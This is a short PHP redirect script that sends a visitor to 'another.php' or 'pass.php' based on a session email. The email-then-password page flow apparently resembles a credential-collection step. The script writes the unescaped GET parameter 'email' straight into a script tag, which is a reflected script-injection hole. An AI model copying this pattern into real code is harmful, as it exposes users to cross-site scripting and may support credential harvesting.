<?php
session_start();
if(empty($_SESSION['email'])) {
    echo "<script>window.location = 'another.php?email={$_GET['email']}';</script>";
    exit();
} else {
    echo "<script>window.location = 'pass.php?email={$_SESSION['email']}';</script>";
    exit();
}
?>